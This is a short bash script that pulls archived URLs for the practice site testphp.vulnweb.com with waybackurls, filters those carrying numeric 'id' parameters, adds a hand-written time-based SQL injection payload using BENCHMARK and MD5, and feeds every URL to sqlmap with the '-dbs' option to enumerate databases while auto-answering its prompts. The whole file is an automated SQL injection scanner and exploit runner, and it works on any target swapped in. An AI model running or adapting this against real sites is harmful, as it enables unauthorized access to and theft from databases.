#!/bin/bash

x=1
i=1
rm ip_param_url.txt

while read -r ln; do
        if echo "$ln" | grep -q -E "\?id=[0-9]{1,5}$" ;then
                ((x++))
                echo "this is the while($i) -> if($x)  loop ln= $ln"
                echo "$ln" >> ip_param_url.txt
        fi
((i++))
done < test.txt
#-------> got using this cmd -> echo "http://testphp.vulnweb.com/login.php" | waybackurls | tee test.txt <--------


echo "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%202669%3DBENCHMARK%285000000%2CMD5%280x4a62416c%29%29" >>  ip_param_url.txt

echo "total number of urls with parameters: $i"
echo "total number of urls with vulnerable parameters: $x"

echo -e "\nokay the next part contains the sql map script\n"

while read -r a; do
echo "line value is: $a"
        if echo y | sqlmap -u "$a" -dbs | grep -q -Ei "critical|error" ; then
                echo "wrong parameter url man check the url once again"
        else
                echo -e "\e[31m this url with parameter might work\e[0m"
        fi
done < ip_param_url.txt
